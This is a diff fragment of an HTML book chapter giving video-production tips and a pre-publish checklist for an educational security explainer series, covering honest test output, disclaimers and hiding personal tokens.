+<li><strong>Cut installation and setup.</strong> Put prerequisites in the description and a pinned comment.</li>
+<li><strong>Show the command before the output.</strong> Let the viewer predict the result.</li>
+<li><strong>Zoom on one line at a time.</strong> Do not show a whole module for a single idea.</li>
+<li><strong>Use chapter cards, not hard cuts.</strong> A two-second card with the stage number and boundary makes the series easier to follow.</li>
+<li><strong>Caption code on screen.</strong> Add the exact command to the lower third when the terminal is small.</li>
+</ul>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Export a clean <code>book.pdf</code> and put the chapter number in the video description. Viewers who want the written version can follow along without pausing the video.</p></div>
+<h3 id="s12-11">Final checklist before publishing</h3>
+<ul>
+<li>[ ] The episode says &quot;educational&quot; and does not claim production security.</li>
+<li>[ ] Stage 0 is clearly labelled unsafe.</li>
+<li>[ ] The demo commands match the chapter exactly.</li>
+<li>[ ] The test output shown is from a real run, not a mock-up.</li>
+<li>[ ] Docker claims distinguish offline tests from integration tests.</li>
+<li>[ ] The audit line <code>audit chain verifies: True</code> is shown honestly.</li>
+<li>[ ] Personal paths, tokens, and notifications are not visible.</li>
+<li>[ ] Captions are enabled or a transcript is linked.</li>
+<li>[ ] The description links the book, <code>README.md</code>, and <code>THREAT_MODEL.md</code>.</li>
+</ul>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ The series teaches a boundary, not a security certification. Keep the disclaimer in the video description, the pinned comment, and the spoken introduction of Episode 0.</p></div>
 </section>
 
       <div class="colophon">
-        Built from <code>book_html.md</code> &middot; 106 sections &middot; explainer series
+        Built from book_html.md · six stages · five appendices
       </div>
     </div>
   </main>
